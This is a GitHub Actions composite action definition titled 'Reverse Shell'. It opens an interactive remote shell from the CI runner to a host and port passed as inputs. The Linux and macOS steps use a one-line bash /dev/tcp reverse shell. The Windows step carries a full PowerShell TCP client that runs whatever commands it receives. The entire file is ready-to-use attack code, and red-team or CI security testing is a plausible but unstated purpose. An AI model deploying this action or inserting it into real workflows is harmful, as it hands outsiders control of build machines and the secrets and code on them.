name: 'Reverse Shell'
description: 'This sends a reverse shell to a given host / port combination.'
inputs:
  host:
    description: 'The hostname or IP address'
    required: true
  port:
    description: 'The port to reach'
    required: true
runs:
  using: "composite"
  steps:
    - name: 'Send revshell from Linux'
      if: runner.os == 'Linux'
      shell: bash
      run: sh -i >& /dev/tcp/$INPUT_HOST/$INPUT_PORT 0>&1
      env:
        INPUT_HOST: ${{ inputs.host }}
        INPUT_PORT: ${{ inputs.port }}

    - name: 'Send revshell from Windows'
      if: runner.os == 'Windows'
      shell: pwsh
      run: $LHOST = '$env:INPUT_HOST'; $LPORT = $env:INPUT_PORT; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
      env:
        INPUT_HOST: ${{ inputs.host }}
        INPUT_PORT: ${{ inputs.port }}

    - name: 'Send revshell from MacOS'
      if: runner.os == 'macOS'
      shell: bash
      run: sh -i >& /dev/tcp/$INPUT_HOST/$INPUT_PORT 0>&1
      env:
        INPUT_HOST: ${{ inputs.host }}
        INPUT_PORT: ${{ inputs.port }}
      
